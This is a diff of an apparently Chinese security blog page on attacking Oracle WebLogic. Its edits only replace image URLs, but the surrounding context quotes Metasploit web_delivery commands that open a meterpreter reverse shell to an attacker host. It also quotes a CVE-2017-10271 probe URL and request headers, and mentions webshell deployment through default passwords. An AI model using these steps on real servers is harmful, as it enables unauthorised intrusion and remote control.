@@ -19,12 +19,12 @@
 <meta property="og:site_name" content="shackle">
 <meta property="og:description" content="0x00 前言0x01漏洞利用    如何快速探测目标所有的 weblogic 默认管理控制台 web 入口    尝试利用 weblogic 管理控制台默认弱口令快速部署自己的 war 包 webshell    在现有 war 包 webshell 的前提下手工传 shell 的几种方式    针对  CVE-2018-2893 的漏洞利用    针对  CVE-2018-2628">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/181017/aLlLklAHla.png?imageslim">
+<meta property="og:image" content="http://pn5jn1i1e.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim">
 <meta property="og:updated_time" content="2018-10-16T17:04:44.989Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mimikatz">
 <meta name="twitter:description" content="0x00 前言0x01漏洞利用    如何快速探测目标所有的 weblogic 默认管理控制台 web 入口    尝试利用 weblogic 管理控制台默认弱口令快速部署自己的 war 包 webshell    在现有 war 包 webshell 的前提下手工传 shell 的几种方式    针对  CVE-2018-2893 的漏洞利用    针对  CVE-2018-2628">
-<meta name="twitter:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/181017/aLlLklAHla.png?imageslim">
+<meta name="twitter:image" content="http://pn5jn1i1e.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim">
   
     <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
   
@@ -223,7 +223,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit –j</span><br><span class="line">msf &gt; sessions -i 1</span><br><span class="line">meterpreter &gt; sysinfo meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
 <h3 id="5、-CVE-2017-10271"><a href="#5、-CVE-2017-10271" class="headerlink" title="5、[CVE-2017-10271]"></a>5、[CVE-2017-10271]</h3><p>漏洞基本原理：即 wls wsat 模块的 RCE,究其底层其实还是 XMLDecoder 的反序列化漏洞 </p>
 <p>首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞<br>http://[目标IP] /wls-wsat/CoordinatorPortType    </p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
 <p>而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.3.195</span><br><span class="line">Accept-Encoding: identity Content-Length: 695</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</span><br><span class="line">Connection: keep-alive Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br></pre></td></tr></table></figure>
 <p>点击’go’ 之后便可看到 meterpreter 已正常回连</p>
